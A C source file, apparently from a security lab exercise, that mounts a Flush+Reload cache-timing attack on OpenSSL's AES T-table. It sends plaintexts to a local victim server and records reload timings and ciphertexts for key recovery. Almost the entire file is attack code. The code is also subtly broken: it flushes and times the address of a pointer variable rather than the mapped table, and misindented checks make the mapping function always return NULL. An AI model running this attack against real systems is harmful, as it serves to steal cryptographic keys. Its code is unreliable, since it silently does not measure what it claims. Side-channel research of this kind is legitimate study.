#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <sys/mman.h>
#include <sys/stat.h>

void clflush(volatile void* Tx) {
    asm volatile("lfence;clflush (%0) \n" :: "c" (Tx));
}

char *timingFileName;
char *cipherFileName;
char *plainFileName;
uint32_t numTraces = 1000000;

char *addr;
int fd = -1;
char *victimBinaryFileName;

FILE *timingFP, *cipherFP, *plainFP;
size_t offset;

uint8_t *plaintext, *ciphertext;
uint32_t *timing;
void *target;
struct sockaddr_in server;
int s;

void init();
void finish();
void printText(uint8_t *text, int count, char *header);
void generatePlaintext();
void doTrace();

void printHelp(char* argv[])
{
    fprintf(
            stderr,
            "Usage: %s [-t timing file name] "
            "[-c cipher file name] "
            "[-p plaintext file name (optional)] "
            "[-n number samples (default: 1M)] "
            "[-o shared library offset of your target (e.g. Te0)] "
            "[-v shared library] "
            "\n",
            argv[0]
           );
    exit(EXIT_FAILURE);
}

void parseOpt(int argc, char *argv[])
{
    int opt;
    while((opt = getopt(argc, argv, "c:t:n:p:v:o:")) != -1){
        switch(opt){
        case 'c':
            cipherFileName = optarg;
            break;
        case 't':
            timingFileName = optarg;
            break;
        case 'p':
            plainFileName = optarg;
            break;
        case 'n':
            numTraces = atoi(optarg);
            break;
        case 'o':
            offset = (int)strtol(optarg, NULL, 16);
            break;
        case 'v':
            victimBinaryFileName = optarg;
            break;
        default:
            printHelp(argv);
        }
    }
    if(timingFileName == NULL){
        printHelp(argv);
    }
    if(cipherFileName == NULL){
        printHelp(argv);
    }
    if (victimBinaryFileName == NULL){
        printHelp(argv);
    }
}

int main(int argc, char** argv)
{
    int i;
    printf("\nWelcome!.\nInitializing program...\n");
    parseOpt(argc, argv);
    //printf("\t[DEBUG]: parseOpt(...) completed.\n");
    //printf("begin\n");
    init();
    //printf("\tinit() completed.\n");
    //printf("Done.\n");
    for (i = 0; i < numTraces; i++){
//#ifdef DEBUG
    printf("Sample number %i out of 1,000,000.\n", i + 1);
//#endif
        doTrace();
    }
    printf("\t[DEBUG]: Done receiving data.\n");
    finish();
    printf("\t[DEBUG]: finish() completed.\n");
    printf("Done\n");
}

void generatePlaintext()
{
    int j;
    for(j = 0; j < 16; j++){
        plaintext[j] = random() & 0xff;
    }
#ifdef DEBUG
    printText(plaintext, 16, "plaintext");
#endif
}
void savePlaintext()
{
    if(plainFP == NULL)
        return;
    printText(plaintext, 16, "printText being saved");
    fwrite(plaintext, sizeof(uint8_t), 16, plainFP);
}
void saveCiphertext()
{
    printText(ciphertext, 16, "ciphertextText being saved");
    fwrite(ciphertext, sizeof(uint8_t), 16, cipherFP);
}
void saveTiming()
{
    printText(timing, 16, "timing being saved");
    fwrite(timing, sizeof(uint32_t), 1, timingFP);
}
void saveTrace()
{
   saveCiphertext();
   saveTiming();
   savePlaintext();
}
static __inline__ uint64_t timer_start (void) {
        unsigned cycles_low, cycles_high;
        asm volatile ("CPUID\n\t"
                    "RDTSC\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t": "=r" (cycles_high), "=r" (cycles_low)::
                    "%rax", "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}

static __inline__ uint64_t timer_stop (void) {
        unsigned cycles_low, cycles_high;
        asm volatile("RDTSCP\n\t"
                    "mov %%edx, %0\n\t"
                    "mov %%eax, %1\n\t"
                    "CPUID\n\t": "=r" (cycles_high), "=r" (cycles_low):: "%rax",
                    "%rbx", "%rcx", "%rdx");
        return ((uint64_t)cycles_high << 32) | cycles_low;
}
static __inline__ void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

uint32_t reload(void *target)
{
    volatile uint32_t time;
    uint64_t t1, t2;
    t1 = timer_start();
    maccess(target);
    t2 = timer_stop();
    printf("\t\tt1 = %i, t2 = %i\n", t1, t2);
    return t2 - t1;
}

void doTrace() {
    int r;
    socklen_t serverlen;
    //printf("\t[DEBUG]: Starting doTrace();\n");
    printf("\tGenerating random text... ");
    generatePlaintext();
    printf("Done.\n\tFlushing T0... ");
    clflush(&target);                // Flushing T0
    //printf("\t[DEBUG]: T0 flushed.\n");
    printf("Done.\n\tSending text to victim... ");
    //if (sendto(s, plaintext, 16, 0, (struct sockaddr*) &server, sizeof server) == -1) exit(EXIT_FAILURE);     // Sending the plaintext to the server.
    //sendto(s, plaintext, 16, 0, (struct sockaddr*) &server, sizeof server);
    send(s, plaintext, 16, 0);

    printf("Done.\n");
    
    //printText(plaintext, 16, "plainText");
    //printf("\t[DEBUG]: message sent to server.\n");

    bool break_loop = false;
    while (break_loop == false) {
        // printf("\t\t[doTrace() - DEBUG]: Awaiting communication started.\n");
        serverlen = sizeof server;
        printf("\tWaiting for incoming message... ");
        //r = recvfrom(s, ciphertext, sizeof ciphertext, 0, (struct sockaddr*) &server, &serverlen);
        //r = accept(s, ciphertext, sizeof ciphertext, 0, (struct sockaddr*) &server, &serverlen);
        r = read( s , ciphertext, 16);



        //printf("\t\t[doTrace() - DEBUG]: Message  received. r size = %i. Ciphertext size = %i.\n", r, sizeof ciphertext);
        printf("Done.\n\tReloading T0 and calculating time... ");
        // printText(ciphertext, 16, "Cihpertext");
        break_loop = true;
        // if ((r<16) && (r > sizeof ciphertext)) {
        //     printf("\t\t[doTrace() - DEBUG]: loop will break now.");
        //     break_loop = true;
        // }
        /*if (r < 16) continue;
        printf("\t[DEBUG]: 'r < 16' continued.\n");
        if (r > sizeof ciphertext) continue;
        printf("\t[DEBUG]: 'r > sizeof ciphertext' continued.\n");*/
        // The code has to break of the loop once a message has been printed.
    }
    // We should have the incoming message by now.
    // printf("\t\t[doTrace() - DEBUG]: done receiving. Reloading now.\n");
    *timing = reload(&target);     // reloading T0 and adquiring the timie.
    //printf("\t\t[doTrace() - DEBUG]: Done reloading, saving now.\n");
    printf("Done.\n\tSaving values... ");
    saveTrace();        // Saving the data to the files.

    printf("Done.\n\tSample completed.\n\n");

    // generate a new plaintext
    // set the cache to a known state by flushing an address
    // send the plaintext to victim (server)for an encryption and receive the ciphertex
    // check current cache state (reload the same address)
    // record timing and ciphertext
#ifdef DEBUG
    printText(ciphertext, 16, "ciphertext");
    printf("Timing: %i\n", *timing);
#endif
}



void printText(uint8_t *text, int count, char *header)
{
    int j;
    printf("%s:", header);
    for (j = 0; j < count; j++){
        printf("%02x ", (int)(text[j] & 0xff));
    }
    printf("\n");
}
void *map_offset(const char *file, size_t offset) {
  int fd = open(file, O_RDONLY);
  if (fd < 0)
    return NULL;
    printf("\t[DEBUG]: fd < 0 .\n");

  char *mapaddress = mmap(0, sysconf(_SC_PAGE_SIZE), PROT_READ, MAP_PRIVATE, fd, offset & ~(sysconf(_SC_PAGE_SIZE) -1));
  close(fd);
  if (mapaddress == MAP_FAILED)
    printf("\t[DEBUG]: Map Failed.\n");
    return NULL;
  printf("\t[DEBUG]: mapping done succesfully.\n");
  return (void *)(mapaddress+(offset & (sysconf(_SC_PAGE_SIZE) -1)));
}

void unmap_offset(void *address) {
  munmap((char *)(((uintptr_t)address) & ~(sysconf(_SC_PAGE_SIZE) -1)),
                sysconf(_SC_PAGE_SIZE));
}

void init()
{
    //printf("\t[init() - DEBUG]: init() started.\n");
    // setup network communication
    printf("\tSetting up network address... ");
    if (inet_pton(AF_INET, "127.0.0.1", &server.sin_addr) <= 0) exit(100);
    printf("Done.\n");
    server.sin_family = AF_INET;
    server.sin_port = htons(10000);

    printf("\tCreating socket... ");
    if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1) exit(101);
    //printf("\t\t[init() - DEBUG]: Socket created.\n");
    if (connect(s, (struct sockaddr *) &server, sizeof server) == -1) exit(102);
    //printf("\t\t[init() - DEBUG]: Socket connected to server.\n");
    // setup the target for monitoring
    printf("Done.\n\tsetting up target... ");

    //target = 00000000002a0d40;
    //target = 0x2a0d40;
    target = map_offset("~openssl/libcrypto.so", 0x2a0d40);

//#ifdef DEBUG
    //printf("offset: %zu\n", offset);
    //printf("target: %p\n", target);
    //printText(target, 16, "Target");
    // printText(target + 256 * 4, 16, "T1");
//#endif
    
    // setup files pointer for writing
    printf("Done.\n\tPreparing output files... ");
    plaintext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    ciphertext = (uint8_t *) malloc(sizeof(uint8_t) * 16);
    timing = (uint32_t *) malloc(sizeof(uint32_t));
    
    timingFP = fopen(timingFileName, "w");
    cipherFP = fopen(cipherFileName, "w");
    if (plainFileName != NULL){
        plainFP = fopen(plainFileName, "w");
    }
    printf("Done.\n\tAll finished.\n\n");
}
void finish()
{
    free(plaintext);
    free(ciphertext);
    free(timing);

    fclose(timingFP);
    fclose(cipherFP);
    if( plainFP != NULL )
        fclose(plainFP);

    unmap_offset(addr);
}
